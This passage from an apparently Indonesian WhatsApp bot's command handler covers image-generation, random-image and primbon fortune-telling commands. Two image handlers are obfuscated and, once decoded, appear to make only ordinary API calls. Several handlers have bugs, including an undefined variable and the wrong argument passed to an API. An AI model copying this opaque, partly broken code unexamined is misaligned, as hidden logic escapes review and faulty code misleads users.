		case 'letterleaves':
		case 'glowingneon':
		case 'fallleaves':
		case 'flamming':
		case 'harrypotter':
		case 'carvedwood':
			if (args.length == 0) return reply(`Example: ${prefix + command} YamadaRyosuke`)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By YamadaRyosuke\n\n Type: ${command}\n\nText: ${args}`})
			break

    // Text Prome
        case 'pornhub':
		case 'glitch':
		case 'avenger':
		case 'space':
		case 'ninjalogo':
		case 'marvelstudio':
		case 'lionlogo':
		case 'wolflogo':
		case 'steel3d':
		case 'wallgravity':
			if (args.length == 0) return reply(`Example: ${prefix + command} YamadaRyosuke`)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 4 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By YamadaRyosuke\n\n Type: ${command}\n\nText: ${args}`})
			break

        case 'blackpink':
		case 'neon':
		case 'greenneon':
		case 'advanceglow':
		case 'futureneon':
		case 'sandwriting':
		case 'sandsummer':
		case 'sandengraved':
		case 'metaldark':
		case 'neonlight':
		case 'holographic':
		case 'text1917':
		case 'minion':
		case 'deluxesilver':
		case 'newyearcard':
		case 'bloodfrosted':
		case 'halloween':
		case 'jokerlogo':
		case 'fireworksparkle':
		case 'natureleaves':
		case 'bokeh':
		case 'toxic':
		case 'strawberry':
		case 'box3d':
		case 'roadwarning':
		case 'breakwall':
		case 'icecold':
		case 'luxury':
		case 'cloud':
		case 'summersand':
		case 'horrorblood':
		case 'thunder':
			if (args.length == 0) return newReply(`Example: ${prefix + command} YamadaRyosuke`)
			if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` }, caption: `Created By YamadaRyosuke\n\n Type: ${command}\n\nText: ${args}`})
			break
	    
	    case 'akira':
            case 'akiyama':
            case 'ana':
            case 'asuna':
            case 'ayuzawa':
            case 'boruto':
            case 'chitoge':
            case 'deidara':
            case 'doraemon':
            case 'elaina':
            case 'emilia':
            case 'erza':
            case 'gremory':
            case 'hestia':
            case 'hinata':
            case 'inori':
            case 'isuzu':
            case 'itachi':
            case 'itori':
            case 'kaga':
            case 'kagura':
            case 'kakasih':
            case 'kaori':
            case 'keneki':
            case 'kotori':
            case 'kurumi':
            case 'loli':
            case 'madara':
            case 'mikasa':
            case 'miku':
            case 'minato':
            case 'naruto':
            case 'nezuko':
            case 'onepiece':
            case 'pokemon':
            case 'rize':
            case 'sagiri':
            case 'sakura':
            case 'sasuke':
            case 'shina':
            case 'shinka':
            case 'shizuka':
            case 'shota':
            case 'toukachan':
            case 'tsunade':
            case 'yuki': {
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Anime/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: (mess.done) }, { quoted: m })
        }
        break
        case 'aesthetic':
            case 'anjing':
            case 'blankpink':
            case 'boneka':
            case 'darkjokes':
            case 'hekel':
            case 'justina':
            case 'kpop':
            case 'kucing':
            case 'mobil':
            case 'motor':
            case 'pubg':
            case 'rose':
            case 'ryujin':
            case 'wallhp': {
            newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Image/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
        break
			case 'cyberspace':
            case 'mountain':
            case 'programming':
            case 'technology': {
            newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Wallpaper/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'cecan':
            case 'china':
            case 'cogan':
            case 'indonesia':
            case 'japan':
            case 'korea':
            case 'malaysia':
            case 'thailand':
            case 'vietnam': {
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: m })
            }
            break
            case 'couple': {
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let random = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.male
                    },
                    caption: `Couple Male`
                }, {
                    quoted: m
                })
                conn.sendMessage(m.chat, {
                    image: {
                        url: random.female
                    },
                    caption: `Couple Female`
                }, {
                    quoted: m
                })
            }
            break
            case 'wallpaper': {
                if (!text) return newReply('Mau Cari Wallpaper Apa?')
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    wallpaper
                } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return newReply('Mau Cari Wikimedia Apa?')
                newReply(mess.wait)
                if (!isPremium && global.db.data.users[m.sender].limit < 1) return newReply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1 // -1 limit
                let {
                    wikimedia
                } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            
            case 'tohd':
            case 'remini': {
                    const _0x4039d2 = _0xc359;
(function (_0x48ec84, _0x42b236) {
    const _0xd6ebe1 = _0xc359, _0x30cbf2 = _0x48ec84();
    while (!![]) {
        try {
            const _0x26770d = -parseInt(_0xd6ebe1(0x9b)) / (-0x1a96 + -0x2b * 0x70 + 0x2d67) + -parseInt(_0xd6ebe1(0x8b)) / (0x3fd + 0x31d + -0xe3 * 0x8) * (parseInt(_0xd6ebe1(0x9a)) / (0x12d * 0x8 + -0x1 * -0xac1 + 0xa13 * -0x2)) + parseInt(_0xd6ebe1(0x91)) / (-0x1f2d + 0xba0 + 0x1391) + parseInt(_0xd6ebe1(0xa2)) / (0x2497 + -0x1 * 0xd03 + 0xa3 * -0x25) + -parseInt(_0xd6ebe1(0xa4)) / (0x463 + -0x2340 + -0x1 * -0x1ee3) * (-parseInt(_0xd6ebe1(0x97)) / (0x3d * -0x17 + 0x24a6 + -0x1f24)) + parseInt(_0xd6ebe1(0x95)) / (-0x2 * 0xcc2 + 0x47f * 0x5 + -0x1 * -0x311) * (parseInt(_0xd6ebe1(0x86)) / (-0x13bc + 0x2 * 0x5a0 + 0x885)) + -parseInt(_0xd6ebe1(0x93)) / (-0x46 * 0x59 + 0x1 * -0x679 + -0x1 * -0x1ed9);
            if (_0x26770d === _0x42b236)
                break;
            else
                _0x30cbf2['push'](_0x30cbf2['shift']());
        } catch (_0x327bdc) {
            _0x30cbf2['push'](_0x30cbf2['shift']());
        }
    }
}(_0x221a, -0xe7686 + 0xc44ee + 0xcc739));
if (!isPremium && global['db'][_0x4039d2(0x9d)][_0x4039d2(0x9e)][m[_0x4039d2(0x9c)]][_0x4039d2(0x9f)] < -0x1a4c + 0x2241 * -0x1 + 0x3c8e)
    return newReply(mess[_0x4039d2(0x96)]);
function _0xc359(_0x107c43, _0x21823c) {
    const _0x38354a = _0x221a();
    return _0xc359 = function (_0x4a0765, _0xf975fe) {
        _0x4a0765 = _0x4a0765 - (-0x142c + 0x8d1 + 0x98 * 0x14);
        let _0x5e1d28 = _0x38354a[_0x4a0765];
        return _0x5e1d28;
    }, _0xc359(_0x107c43, _0x21823c);
}
db[_0x4039d2(0x9d)][_0x4039d2(0x9e)][m[_0x4039d2(0x9c)]][_0x4039d2(0x9f)] -= -0x4c4 * 0x7 + -0x1d * 0x10b + -0x8 * -0x7f4;
if (!quoted)
    return newReply(_0x4039d2(0x8c) + _0x4039d2(0x92) + _0x4039d2(0x87) + _0x4039d2(0x94) + (prefix + command));
function _0x221a() {
    const _0x17121e = [
        'i.lolhuman',
        'https://ap',
        '636516oXzUTF',
        'y\x20Image\x20De',
        '1495410XTmMqn',
        'on\x20',
        '488KlwxYE',
        'endLimit',
        '63ANmNHN',
        'test',
        '&img=',
        '88650XIUmRt',
        '1180439qoCTQg',
        'sender',
        'data',
        'users',
        'limit',
        'e?apikey=',
        'dSaveMedia',
        '3308435mvTxxU',
        'wait',
        '227382eqHZxf',
        'magetoanim',
        'chat',
        '135864ezbpoO',
        'ngan\x20Capti',
        'downloadAn',
        '.xyz/api/i',
        'sendMessag',
        '4nelVhi',
        'Kirim/Repl',
        'done',
        'Message'
    ];
    _0x221a = function () {
        return _0x17121e;
    };
    return _0x221a();
}
if (!/image/[_0x4039d2(0x98)](mime))
    return newReply(_0x4039d2(0x8c) + _0x4039d2(0x92) + _0x4039d2(0x87) + _0x4039d2(0x94) + (prefix + command));
if (/webp/[_0x4039d2(0x98)](mime))
    return newReply(_0x4039d2(0x8c) + _0x4039d2(0x92) + _0x4039d2(0x87) + _0x4039d2(0x94) + (prefix + command));
newReply(mess[_0x4039d2(0xa3)]);
const media = await conn[_0x4039d2(0x88) + _0x4039d2(0xa1) + _0x4039d2(0x8e)](quoted), anu = await TelegraPh(media);
let get_result = await getBuffer(_0x4039d2(0x90) + _0x4039d2(0x8f) + _0x4039d2(0x89) + _0x4039d2(0xa5) + _0x4039d2(0xa0) + apikey + _0x4039d2(0x99) + anu);
conn[_0x4039d2(0x8a) + 'e'](m[_0x4039d2(0x85)], {
    'image': { 'url': get_result },
    'caption': mess[_0x4039d2(0x8d)]
}, { 'quoted': m });
            }
            break
			
			case 'jadianime':
                const _0x8501f3 = _0x99c2;
(function (_0x4ff729, _0x1b655b) {
    const _0x5204ca = _0x99c2, _0x4362e5 = _0x4ff729();
    while (!![]) {
        try {
            const _0x5b8bfc = parseInt(_0x5204ca(0x1ba)) / (0x969 + -0x74b + -0x21d) + -parseInt(_0x5204ca(0x1bb)) / (-0x2 * 0x78b + 0x19af + 0xa97 * -0x1) + -parseInt(_0x5204ca(0x1c6)) / (0x65 * -0x2f + -0x29 * 0xc7 + 0x326d) * (parseInt(_0x5204ca(0x1c0)) / (-0x1c08 + -0x1248 + 0x2e54)) + parseInt(_0x5204ca(0x1d1)) / (-0x33 * -0x77 + 0x24a3 + -0x3c53) + parseInt(_0x5204ca(0x1bc)) / (-0xe69 + 0x1177 + -0x308) * (parseInt(_0x5204ca(0x1c4)) / (0x1 * 0xdfa + 0x16b8 + 0x7 * -0x53d)) + parseInt(_0x5204ca(0x1b7)) / (-0xa75 * 0x2 + -0x1a66 + 0x2f58) + -parseInt(_0x5204ca(0x1c7)) / (0x37 * -0x40 + -0x269 * -0x9 + -0x7e8);
            if (_0x5b8bfc === _0x1b655b)
                break;
            else
                _0x4362e5['push'](_0x4362e5['shift']());
        } catch (_0x407554) {
            _0x4362e5['push'](_0x4362e5['shift']());
        }
    }
}(_0x4e33, 0x2640b * 0x2 + -0x2 * -0x4881e + -0x8fd67 * 0x1));
if (!isPremium && global['db'][_0x8501f3(0x1bd)][_0x8501f3(0x1ce)][m[_0x8501f3(0x1c3)]][_0x8501f3(0x1b5)] < -0x20b * 0x1 + 0x3c7 * -0x4 + 0x1128)
    return newReply(mess[_0x8501f3(0x1b4)]);
db[_0x8501f3(0x1bd)][_0x8501f3(0x1ce)][m[_0x8501f3(0x1c3)]][_0x8501f3(0x1b5)] -= 0x116 * -0x11 + 0xcd3 * 0x1 + -0x5ad * -0x1;
if (!isMedia)
    return newReply(_0x8501f3(0x1b6) + _0x8501f3(0x1be) + _0x8501f3(0x1bf) + (prefix + command) + (_0x8501f3(0x1d0) + _0x8501f3(0x1b2) + _0x8501f3(0x1c5) + _0x8501f3(0x1b9)));
newReply(mess[_0x8501f3(0x1cb)]);
let anu = await conn[_0x8501f3(0x1cd) + _0x8501f3(0x1cc) + _0x8501f3(0x1cf)](quoted), wm_dryan = await TelegraPh(anu), get_result = await getBuffer(_0x8501f3(0x1c1) + _0x8501f3(0x1c9) + _0x8501f3(0x1d2) + _0x8501f3(0x1ca) + _0x8501f3(0x1d3) + apikey + _0x8501f3(0x1c2) + anu);
conn[_0x8501f3(0x1b8) + 'e'](m[_0x8501f3(0x1b3)], {
    'image': { 'url': get_result },
    'caption': mess[_0x8501f3(0x1c8)]
});
function _0x99c2(_0x124c06, _0x36c2fb) {
    const _0x197eae = _0x4e33();
    return _0x99c2 = function (_0x2d3197, _0x1d3eb2) {
        _0x2d3197 = _0x2d3197 - (-0x1c1 * -0x1 + -0x1219 + -0x2 * -0x905);
        let _0x391cb7 = _0x197eae[_0x2d3197];
        return _0x391cb7;
    }, _0x99c2(_0x124c06, _0x36c2fb);
}
function _0x4e33() {
    const _0x22038e = [
        'Kirim\x20gamb',
        '3649752hZJPOf',
        'sendMessag',
        'kirim',
        '264976SOuBIf',
        '782494qbJLwN',
        '6tRDOYc',
        'data',
        'ar\x20lalu\x20re',
        'ply\x20',
        '1968goGHUe',
        'https://ap',
        '&img=',
        'sender',
        '4209569CUHzSb',
        'g\x20sudah\x20di',
        '147yCyNqG',
        '8057340lvtGQI',
        'done',
        'i.lolhuman',
        'magetoanim',
        'wait',
        'dSaveMedia',
        'downloadAn',
        'users',
        'Message',
        '\x20atau\x20tag\x20',
        '1531200rbvHIN',
        '.xyz/api/i',
        'e?apikey=',
        'gambar\x20yan',
        'chat',
        'endLimit',
        'limit'
    ];
    _0x4e33 = function () {
        return _0x22038e;
    };
    return _0x4e33();
}
            break
			case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) return newReply(`Contoh : ${prefix + command} 6288292024190`)
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) return newReply(`Contoh : ${prefix + command} belanja`)
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika Ardianta`)
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika|Novia`)
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) return newReply(`Contoh : ${prefix + command} 6, 12, 2020`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)return newReply(`Contoh : ${prefix+ command} 28, 12, 2021`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) return newReply(`Contoh : 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) return `Contoh : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) return newReply(`Contoh : ${prefix + command} 7, 7, 2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) return newReply(`Contoh : ${prefix + command} Dika, 7, 7, 2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
